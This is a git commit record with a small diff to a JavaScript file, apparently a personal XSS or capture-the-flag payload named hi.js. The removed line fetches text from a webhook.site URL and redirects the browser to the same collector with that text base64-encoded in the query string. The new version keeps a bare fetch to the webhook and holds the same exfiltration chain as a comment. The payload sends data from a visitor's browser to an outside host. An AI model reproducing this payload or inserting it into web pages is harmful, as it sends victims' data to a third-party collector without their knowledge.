a3bae25f1ee2dbfb5d831a9f5a3b0d260738d365
Rishabh <140229408+CoderZonora@users.noreply.github.com>
2024-08-02 20:35:44 +0530

    Update hi.js

--- hi.js
+++ hi.js
@@ -1,2 +1,4 @@
 
-fetch('https://webhook.site/76545f8b-3667-4b31-9346-0f05f721869f/test').then(response => response.text()).then(text => window.location.href =`https://webhook.site/76545f8b-3667-4b31-9346-0f05f721869f?cz=${btoa(text)}`);
+fetch(`https://webhook.site/76545f8b-3667-4b31-9346-0f05f721869f/test`)
+  
+  //.then(response => response.text()).then(text => window.location.href =`https://webhook.site/76545f8b-3667-4b31-9346-0f05f721869f?cz=${btoa(text)}`);
